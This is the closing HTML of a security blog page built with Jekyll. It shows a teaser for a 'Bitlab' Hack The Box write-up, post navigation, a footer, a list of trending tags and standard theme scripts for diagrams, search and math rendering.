data-toc-skip>Bitlab</h3><div class="text-muted small"><p> Bitlab - Medium Box running on Linux. GitLab // x32dbg // Debugging / PostGre // git pull // JavaScript ENUMERATION NMAP So,… let’s first start NMAP: Nmap scan report for 10.10.10.114 Host is up...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/Bitlab/" class="btn btn-outline-primary" prompt="Older"><p>Bitlab</p></a> <a href="/posts/Worker/" class="btn btn-outline-primary" prompt="Newer"><p>Worker</p></a></div></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center text-muted"><div class="footer-left"><p class="mb-0"> © 2023 <a href="https://twitter.com/cybersec_space">eng4ge</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/notes/">Notes</a> <a class="post-tag" href="/tags/portswigger/">Portswigger</a> <a class="post-tag" href="/tags/web-application/">Web Application</a> <a class="post-tag" href="/tags/linux/">Linux</a> <a class="post-tag" href="/tags/clear-text-credentials/">Clear Text Credentials</a> <a class="post-tag" href="/tags/password-reuse/">Password Reuse</a> <a class="post-tag" href="/tags/windows/">Windows</a> <a class="post-tag" href="/tags/deserialization/">Deserialization</a> <a class="post-tag" href="/tags/misconfiguration/">Misconfiguration</a> <a class="post-tag" href="/tags/password-cracking/">Password Cracking</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><script src="https://cdn.jsdelivr.net/npm/mermaid@8/dist/mermaid.min.js"></script> <script> $(function() { function updateMermaid(event) { if (event.source === window && event.data && event.data.direction === ModeToggle.ID) { const mode = event.data.message; if (typeof mermaid === "undefined") { return; } let expectedTheme = (mode === ModeToggle.DARK_MODE? "dark" : "default"); let config = { theme: expectedTheme }; /* Re-render the SVG › <https://github.com/mermaid-js/mermaid/issues/311#issuecomment-332557344> */ $(".mermaid").each(function() { let svgCode = $(this).prev().children().html(); $(this).removeAttr("data-processed"); $(this).html(svgCode); }); mermaid.initialize(config); mermaid.init(undefined, ".mermaid"); } } let initTheme = "default"; if ($("html[mode=dark]").length > 0 || ($("html[mode]").length == 0 && window.matchMedia("(prefers-color-scheme: dark)").matches ) ) { initTheme = "dark"; } let mermaidConf = { theme: initTheme /* <default|dark|forest|neutral> */ }; /* Markdown converts to HTML */ $("pre").has("code.language-mermaid").each(function() { let svgCode = $(this).children().html(); $(this).addClass("unloaded"); $(this).after(`<div class=\"mermaid\">${svgCode}</div>`); }); mermaid.initialize(mermaidConf); window.addEventListener("message", updateMermaid); }); </script><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/lozad/dist/lozad.min.js,npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script> /* see: <https://docs.mathjax.org/en/latest/options/input/tex.html#tex-options> */ MathJax = { tex: { inlineMath: [ /* start/end delimiter pairs for in-line math */ ['$','$'], ['\\(','\\)'] ], displayMath: [ /* start/end delimiter pairs for display math */ ['$$', '$$'], ['\\[', '\\]'] ] } }; </script> <script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script> <script type="text/javascript" id="MathJax-script" async src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-chtml.js"> </script> <script src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.16.1,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script defer src="/app.js"></script>
